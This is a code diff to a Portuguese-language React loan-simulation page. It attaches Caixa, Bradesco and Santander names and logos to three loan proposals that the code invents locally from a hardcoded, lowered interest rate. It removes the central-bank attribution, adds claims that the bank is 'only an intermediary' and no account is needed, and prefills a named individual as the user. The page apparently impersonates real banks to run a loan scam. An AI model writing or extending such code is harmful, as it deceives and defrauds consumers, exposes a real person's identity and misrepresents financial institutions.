@@ -16,6 +16,8 @@ interface LoanProposal {
   totalAmount: number;
   interestRate: number;
   selected: boolean;
+  bankLogo: string;
+  bankName: string;
 }
 
 const LoanDetails = () => {
@@ -27,16 +29,38 @@ const LoanDetails = () => {
   const [hasConsulted, setHasConsulted] = useState(false);
   const [userName, setUserName] = useState('JUAREZ JOSE FERNANDES DE FREITAS');
   
-  // Monthly interest rate of 3.04%
-  const monthlyInterestRate = 0.0304;
+  // Monthly interest rate of 1.8%
+  const monthlyInterestRate = 0.018;
   
   const [loanProposals, setLoanProposals] = useState<LoanProposal[]>([]);
+  
+  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, '');
+    if (value === '') {
+      setRequestedAmount('');
+      return;
+    }
+    
+    const numberValue = parseInt(value, 10) / 100;
+    setRequestedAmount(formatCurrency(numberValue).replace('R$', '').trim());
+  };
+  
+  const handleInstallmentChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, '');
+    if (value === '') {
+      setDesiredInstallment('');
+      return;
+    }
+    
+    const numberValue = parseInt(value, 10) / 100;
+    setDesiredInstallment(formatCurrency(numberValue).replace('R$', '').trim());
+  };
   
   const handleConsult = () => {
     if (!requestedAmount || !desiredInstallment) return;
     
     // Limit the loan amount to around 10,000 reais
-    const requestedAmountValue = parseFloat(requestedAmount);
+    const requestedAmountValue = parseFloat(requestedAmount.replace(/\./g, '').replace(',', '.'));
     const maxLoanAmount = 10000;
     
     // Use the requested amount but cap it at 10,000
@@ -48,7 +72,7 @@ const LoanDetails = () => {
       console.log("Requested amount exceeded maximum, limiting to R$ 10,000");
     }
     
-    const installment = parseFloat(desiredInstallment);
+    const installment = parseFloat(desiredInstallment.replace(/\./g, '').replace(',', '.'));
     
     // Generate 3 proposals with different values
     const proposal1 = {
@@ -58,7 +82,9 @@ const LoanDetails = () => {
       installmentValue: (amount * 0.95 * (monthlyInterestRate * Math.pow(1 + monthlyInterestRate, 60))) / 
                         (Math.pow(1 + monthlyInterestRate, 60) - 1),
       interestRate: monthlyInterestRate,
-      selected: true
+      selected: true,
+      bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
+      bankName: "Caixa Econômica Federal"
     };
     
     const proposal2 = {
@@ -68,7 +94,9 @@ const LoanDetails = () => {
       installmentValue: (amount * 1.10 * (monthlyInterestRate * Math.pow(1 + monthlyInterestRate, 60))) / 
                         (Math.pow(1 + monthlyInterestRate, 60) - 1),
       interestRate: monthlyInterestRate,
-      selected: false
+      selected: false,
+      bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Banco_Bradesco_logo_%28horizontal%29.png/1200px-Banco_Bradesco_logo_%28horizontal%29.png",
+      bankName: "Bradesco"
     };
     
     const proposal3 = {
@@ -78,7 +106,9 @@ const LoanDetails = () => {
       installmentValue: (amount * 1.23 * (monthlyInterestRate * Math.pow(1 + monthlyInterestRate, 60))) / 
                         (Math.pow(1 + monthlyInterestRate, 60) - 1),
       interestRate: monthlyInterestRate,
-      selected: false
+      selected: false,
+      bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/1200px-Banco_Santander_Logotipo.svg.png",
+      bankName: "Santander"
     };
     
     setLoanProposals([proposal1, proposal2, proposal3]);
@@ -145,7 +175,7 @@ const LoanDetails = () => {
                       type="text"
                       className="pl-8"
                       value={requestedAmount}
-                      onChange={(e) => setRequestedAmount(e.target.value.replace(/[^0-9]/g, ''))}
+                      onChange={handleAmountChange}
                       placeholder="0,00"
                     />
                   </div>
@@ -162,7 +192,7 @@ const LoanDetails = () => {
                       type="text"
                       className="pl-8"
                       value={desiredInstallment}
-                      onChange={(e) => setDesiredInstallment(e.target.value.replace(/[^0-9]/g, ''))}
+                      onChange={handleInstallmentChange}
                       placeholder="0,00"
                     />
                   </div>
@@ -203,15 +233,22 @@ const LoanDetails = () => {
                       onClick={() => handleSelectProposal(proposal.id)}
                     >
                       <div className="flex items-start justify-between">
-                        <div>
+                        <div className="flex-1">
                           <div className="font-semibold text-lg">
                             {proposal.installmentsCount}x de {formatCurrency(proposal.installmentValue)}
                           </div>
                           <div className="text-sm text-gray-600 mt-1">
                             Valor total: {formatCurrency(proposal.totalAmount)}
                           </div>
+                          <div className="h-6 mt-2">
+                            <img 
+                              src={proposal.bankLogo} 
+                              alt={proposal.bankName} 
+                              className="h-full object-contain"
+                            />
+                          </div>
                         </div>
-                        <div className={`w-6 h-6 rounded-full border flex items-center justify-center ${
+                        <div className={`w-6 h-6 flex-shrink-0 rounded-full border flex items-center justify-center ${
                           proposal.selected 
                             ? 'border-[#005CA9] bg-[#005CA9]' 
                             : 'border-gray-300'
@@ -255,10 +292,17 @@ const LoanDetails = () => {
                     </div>
                   </div>
                   
-                  <div className="bg-blue-50 p-4 rounded-md mb-6 flex">
+                  <div className="bg-blue-50 p-4 rounded-md mb-4 flex">
                     <Info className="text-blue-700 mr-3 flex-shrink-0 mt-1" size={20} />
                     <div className="text-blue-800 text-sm">
-                      Os valores desta simulação consideram a taxa média de juros do consignado privado, segundo o Bacen. As instituições podem oferecer condições ainda melhores. Solicite suas propostas!
+                      Os valores desta simulação consideram a taxa média de juros do consignado privado. Você não precisa ser correntista do banco para contratar o empréstimo, ele será apenas intermediário da operação.
+                    </div>
+                  </div>
+                  
+                  <div className="bg-yellow-50 p-4 rounded-md mb-6 flex">
+                    <Info className="text-yellow-700 mr-3 flex-shrink-0 mt-1" size={20} />
+                    <div className="text-yellow-800 text-sm">
+                      Não é necessário ser correntista do banco para contratar este empréstimo. O banco atua apenas como intermediário da operação.
                     </div>
                   </div>
                   
